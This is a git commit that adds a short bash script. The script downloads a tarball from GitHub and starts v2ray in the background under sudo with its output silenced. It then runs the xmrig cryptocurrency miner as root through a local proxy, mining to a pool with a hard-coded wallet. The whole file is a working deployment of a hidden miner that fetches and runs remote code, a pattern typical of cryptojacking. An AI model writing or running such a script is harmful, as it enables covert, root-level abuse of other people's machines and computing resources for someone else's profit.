e5843cc986b2e9c538a7e0ada5b96fd6f9583f7f
prendibs <94189491+prendibs@users.noreply.github.com>
2025-08-08 18:14:34 +0700

    Add files via upload

---
+++ na.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+#love u fika
+
+wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
+nohup sudo ./v2ray run --config=na.json </dev/null >/dev/null 2>&1 &
+echo "love u fika"
+sudo ./xmrig -B -x 127.0.0.1:443 -o ca-tarirx.luckypool.io:9118 -u 16kR6ieJE4668xwonNwJJE82VYw4AsRuuVSzSC4DGF7rNVhLEweoVhV2FavukkoNrNP6DfpDhudTbHcjnLH47fJwW4J3isj5Y6MjSLx -p na -a rx/0 -k --randomx-1gb-pages
